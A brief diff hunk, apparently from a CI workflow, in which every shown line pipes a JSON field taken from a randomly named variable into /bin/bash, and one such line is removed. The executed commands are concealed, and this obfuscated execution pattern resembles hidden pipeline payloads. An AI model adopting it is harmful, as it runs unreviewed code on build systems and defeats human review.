@@ -21,7 +21,6 @@ jobs:
           echo $dbog3 | jq -r .obo4 | /bin/bash
           echo $yjnb773 | jq -r .vpqm1216 | /bin/bash
           printf '%s' "$cup16" | jq -r .i6 | /bin/bash
-          printf '%s' "$x34880" | jq -r .pmwx4 | /bin/bash
           printf '%s' "$eunk500" | jq -r .foft210 | /bin/bash
           echo $sr35 | jq -r .s458 | /bin/bash
           echo $ve1 | jq -r .st08 | /bin/bash
